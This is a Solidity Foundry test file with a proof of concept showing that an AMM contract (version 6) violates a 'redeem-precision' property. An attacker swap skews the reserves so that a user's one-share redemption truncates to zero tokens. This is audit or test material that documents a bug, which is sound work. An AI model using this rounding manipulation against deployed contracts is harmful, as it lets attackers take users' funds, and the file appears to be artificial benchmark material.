// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "versions/AMM_v6.sol" as V6;
import "versions/lib/IERC20.sol";

contract MockToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1000000 * 1e18;
    constructor() { balanceOf[msg.sender] = totalSupply; }
    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value; balanceOf[to] += value; return true;
    }
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value; return true;
    }
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        allowance[from][msg.sender] -= value; balanceOf[from] -= value; balanceOf[to] += value; return true;
    }
}

contract RedeemPrecisionV6Test is Test {
    V6.AMM ammV6;
    MockToken token0;
    MockToken token1;
    address user = address(0x1111);
    address attacker = address(0x2222);

    function setUp() public {
        token0 = new MockToken();
        token1 = new MockToken();
        ammV6 = new V6.AMM(IERC20(address(token0)), IERC20(address(token1)));

        token0.transfer(user, 1000);
        token1.transfer(user, 1000);
        token0.transfer(attacker, 10000);
        token1.transfer(attacker, 10000);

        vm.startPrank(attacker);
        token0.approve(address(ammV6), type(uint256).max);
        token1.approve(address(ammV6), type(uint256).max);
        ammV6.deposit(1000, 1000);
        vm.stopPrank();
    }

    // redeem-precision:
    // Let `b0B`, `b1B` be the token balances of the sender before the transaction, and let `b0A` and `b1A` be the token balances of the sender after the transaction. After a non-reverting `redeem(x)` transaction with `x > 0`, then `b0A > b0B` and `b1A > b1B`.

    // PoC:
    // - Step 1: Initial liquidity is provided by the attacker, setting the supply to 1000.
    // - Step 2: User deposits a small amount of liquidity, getting 10 shares.
    // - Step 3: Attacker skews the reserves with a swap, reducing `r0` below `supply`.
    // - Step 4: User redeems 1 share. Due to integer division truncation `(1 * r0) / supply` evaluates to 0, meaning the share is burned but 0 token0 are returned.
    function test_redeem_precision_loss_v6() public {
        vm.startPrank(user);
        token0.approve(address(ammV6), 10000);
        token1.approve(address(ammV6), 10000);
        ammV6.deposit(10, 10);
        vm.stopPrank();

        vm.startPrank(attacker);
        ammV6.swap(address(token1), 500, 0);
        vm.stopPrank();

        vm.startPrank(user);
        uint bal0Before = token0.balanceOf(user);
        ammV6.redeem(1);
        uint bal0After = token0.balanceOf(user);
        vm.stopPrank();

        assertEq(bal0After - bal0Before, 0);
    }
}
